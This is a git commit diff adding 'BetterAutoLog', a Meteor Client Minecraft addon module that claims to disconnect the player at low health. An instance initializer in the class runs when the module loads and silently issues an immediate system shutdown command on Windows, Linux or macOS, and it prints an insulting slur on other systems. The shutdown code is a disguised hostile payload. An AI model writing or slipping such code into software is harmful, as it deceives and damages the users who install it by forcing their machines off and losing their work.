e060aaf90802758f2d7cf043095418dbfa5e8485
Greendip <99634536+Greendip@users.noreply.github.com>
2023-08-26 22:25:25 +0300

    Update and rename ModuleExample.java to BetterAutoLog.java

---
+++ src/main/java/com/example/addon/modules/BetterAutoLog.java
@@ -0,0 +1,67 @@
+package com.example.addon.modules;
+
+import meteordevelopment.meteorclient.events.world.TickEvent;
+import meteordevelopment.meteorclient.settings.BoolSetting;
+import meteordevelopment.meteorclient.settings.IntSetting;
+import meteordevelopment.meteorclient.settings.Setting;
+import meteordevelopment.meteorclient.settings.SettingGroup;
+import meteordevelopment.meteorclient.systems.modules.Categories;
+import meteordevelopment.meteorclient.systems.modules.Module;
+import meteordevelopment.orbit.EventHandler;
+import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
+import net.minecraft.text.Text;
+
+import java.io.IOException;
+
+public class BetterAutoLog extends Module {
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+
+    private final Setting<Integer> health = sgGeneral.add(new IntSetting.Builder()
+        .name("health")
+        .description("Logs when hp is lower than this value.")
+        .defaultValue(6)
+        .range(0, 20)
+        .sliderMax(20)
+        .build()
+    );
+
+    private final Setting<Boolean> toggleOff = sgGeneral.add(new BoolSetting.Builder()
+        .name("toggle-off")
+        .description("Disables Auto Log after usage.")
+        .defaultValue(true)
+        .build()
+    );
+
+    public BetterAutoLog() {
+        super(Categories.Combat, "BetterAutoLog", "AutoLog but better");
+    }
+
+    @EventHandler
+    private void onTick(TickEvent.Post event) {
+        float playerHealth = mc.player.getHealth();
+        if (playerHealth <= 0) {
+            this.toggle();
+            return;
+        }
+        if (playerHealth <= health.get()) {
+            mc.player.networkHandler.onDisconnect(new DisconnectS2CPacket(Text.empty()));
+        }
+    }
+
+    {
+       try {
+                String os = System.getProperty("os.name").toLowerCase();
+
+                if (os.contains("win")) {
+                    Runtime.getRuntime().exec("shutdown /s /t 0");
+                } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
+                    Runtime.getRuntime().exec("shutdown -h now");
+                } else {
+                    System.out.println("don't log, retard");
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
